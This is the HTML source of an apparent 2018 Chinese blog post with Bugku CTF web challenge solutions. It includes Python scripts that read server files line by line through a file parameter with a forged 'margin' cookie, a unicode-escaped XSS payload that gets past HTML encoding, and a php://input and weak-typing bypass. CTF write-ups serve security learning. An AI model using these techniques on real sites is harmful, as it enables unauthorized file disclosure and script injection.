@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>Bugkuctf-Web(2) | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="Bugkuctf-Web">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugkuctf-Web(2)">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/26423/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="Bugkuctf-Web">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/54.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/55.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/56.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/57.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/58.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/59.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/60.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/61.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/62.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/63.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/64.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/65.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/66.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/67.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/68.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/69.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/70.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/71.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/72.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/73.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/74.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/75.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/76.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/77.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/78.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/79.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/80.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/81.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/82.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/83.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/84.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/85.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/86.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/87.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/88.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/89.png">
+<meta property="og:updated_time" content="2018-08-06T03:45:00.809Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bugkuctf-Web(2)">
+<meta name="twitter:description" content="Bugkuctf-Web">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/54.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bugkuctf-Web(2)</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cookies欺骗"><span class="post-toc-number">1.</span> <span class="post-toc-text">cookies欺骗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS注入测试"><span class="post-toc-number">2.</span> <span class="post-toc-text">XSS注入测试</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#never-give-up"><span class="post-toc-number">3.</span> <span class="post-toc-text">never give up</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#welcome-to-bugkuctf"><span class="post-toc-number">4.</span> <span class="post-toc-text">welcome to bugkuctf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#过狗一句话"><span class="post-toc-number">5.</span> <span class="post-toc-text">过狗一句话</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#字符？正则？"><span class="post-toc-number">6.</span> <span class="post-toc-text">字符？正则？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前女友-SKCTF"><span class="post-toc-number">7.</span> <span class="post-toc-text">前女友(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#login1-SKCTF"><span class="post-toc-number">8.</span> <span class="post-toc-text">login1(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#你从哪里来"><span class="post-toc-number">9.</span> <span class="post-toc-text">你从哪里来</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#md5-collision-NUPT-CTF"><span class="post-toc-number">10.</span> <span class="post-toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#程序员本地网站"><span class="post-toc-number">11.</span> <span class="post-toc-text">程序员本地网站</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#各种绕过"><span class="post-toc-number">12.</span> <span class="post-toc-text">各种绕过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web8"><span class="post-toc-number">13.</span> <span class="post-toc-text">web8</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#细心"><span class="post-toc-number">14.</span> <span class="post-toc-text">细心</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#求getshell"><span class="post-toc-number">15.</span> <span class="post-toc-text">求getshell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#INSERT-INTO注入"><span class="post-toc-number">16.</span> <span class="post-toc-text">INSERT INTO注入</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-Bugkuctf-Web(2)"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bugkuctf-Web(2)</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-08-02 22:48:00" datetime="2018-08-02T14:48:00.000Z"  itemprop="datePublished">2018-08-02</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Bugkuctf-Web/">Bugkuctf-Web</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">21</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>Bugkuctf中的Web题解(二)<a id="more"></a></p>
+<h3 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h3><p>网址：<a href="http://120.24.86.145:8002/web11/" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/</a></p>
+<p>进去页面一看是一串乱码，但发现url中包含参数filename=a2V5cy50eHQ=，将a2V5cy50eHQ=进行base64解码得keys.txt，将index.php进行base64加密后赋值给filename参数，同时指定line参数的值为1，发现输出了php代码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/54.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>于是猜测line为行数，写个脚本读出index.php的所有代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw'</span>%i</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.text:</span><br><span class="line">        print(r.text,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);</span><br><span class="line"></span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line"></span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);</span><br><span class="line"></span><br><span class="line">$file_list = array(</span><br><span class="line"></span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;,</span><br><span class="line"></span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[2]=&apos;keys.php&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line">echo $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>从源代码可以看出，flag在keys.php中，而我们要逐行读取keys.php文件的内容，就必须设置cookie:margin=margin</p>
+<p>直接上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">'margin'</span>:<span class="string">'margin'</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=a2V5cy5waHA='</span>%i</span><br><span class="line">    r = requests.get(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> r.text:</span><br><span class="line">        print(r.text,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">'KEY&#123;key_keys&#125;'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="XSS注入测试"><a href="#XSS注入测试" class="headerlink" title="XSS注入测试"></a>XSS注入测试</h3><p>网址：<a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">http://103.238.227.13:10089/</a></p>
+<p>页面提示我们要注入一段xss代码，看一下源代码</p>
+<p>关键代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> s=<span class="string">""</span>;	</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>id为s的是一个为空的div标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"s"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>举个例子说明一下innerHTML</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"baidu"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">document.getElementById("baidu")　获得 a 这个元素</span><br><span class="line">document.getElementById("baidu") .innerHTML　获得 a 这个元素内的HTML代码（即<span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>）</span><br><span class="line">document.getElementById("baidu") .innerHTML = "<span class="tag">&lt;<span class="name">em</span>&gt;</span>谷歌<span class="tag">&lt;/<span class="name">em</span>&gt;</span>"　</span><br><span class="line">设置 a 这个元素内的HTML代码，</span><br><span class="line">设置后<span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">就变为<span class="tag">&lt;<span class="name">em</span>&gt;</span>谷歌<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里说明一下如果字符串中拼接的 HTML 标签中有 script 标签，那么该段脚本是无法执行的，这并不是 bug，而是 w3c 的文档规定的 </p>
+<p>再来看看这题，没有给出注入点，按照惯例是id，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(_key_)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>查看源代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> s=<span class="string">"&amp;lt;script&amp;gt;"</span>;	<span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现&lt;&gt;被html编码，即被过滤了</p>
+<p>因为页面编码为utf-8，所以可以将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来 </p>
+<p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> s=<span class="string">"\u003cscript\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\u003c/script\u003e"</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://blog.csdn.net/wy_97/article/details/77755098" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77755098</a></p>
+<h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>网址：<a href="http://120.24.86.145:8006/test/hello.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test/hello.php</a></p>
+<p>页面源代码提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1p.html--&gt;</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面</a></p>
+<p>那么访问其源代码view-source:<a href="http://120.24.86.145:8006/test/1p/html" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p/html</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"Javascript"</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = <span class="built_in">unescape</span>(Words);</span><br><span class="line"><span class="built_in">document</span>.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="comment">// --&gt;</span></span><br><span class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键在于Words这个变量，第一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21</span><br></pre></td></tr></table></figure>
+<p>看起来像是被url编码过，url解码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure>
+<p>后面是被注释的代码：先base64解码后url解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看的出来这就是hello.php的源代码，这里出题人没有隐藏文件名，知道了文件名f4l2a3g.txt其实就可以直接访问</p>
+<p>但是按照出题人的意思我们要绕过过滤，首先$data必须为”bugku is a nice plateform”，而$data值取决于函数file_get_contents，这里查询得知php后门技巧，利用php协议input，接收post的信息，经过函数file_get_contents就可以读取出来，所以$a=php://input，然后post字符串”bugku is a nice plateform”</p>
+<p>接着是$id要等于0，但是代码开头如果$id为0则重定向，所以不能为0，利用php弱类型的特性可以给$id赋值0a</p>
